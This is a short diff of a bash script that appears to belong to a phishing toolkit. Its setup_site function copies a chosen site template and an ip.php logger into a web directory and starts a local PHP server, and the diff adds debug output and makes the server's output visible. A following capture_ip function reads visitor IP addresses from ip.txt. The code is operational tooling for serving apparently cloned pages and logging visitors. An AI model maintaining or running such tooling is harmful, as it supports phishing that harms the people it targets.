@@ -405,10 +405,13 @@ setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
+	echo -e "\n${GREEN}[DEBUG] Files copied: $(ls .server/www/)"${WHITE}
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+	cd .server/www
+	php -S "$HOST":"$PORT" 2>&1 &
+	sleep 3
+	echo -e "\n${GREEN}[+] PHP server should be running on http://$HOST:$PORT"${WHITE}
 }
-
 ## Get IP address
 capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
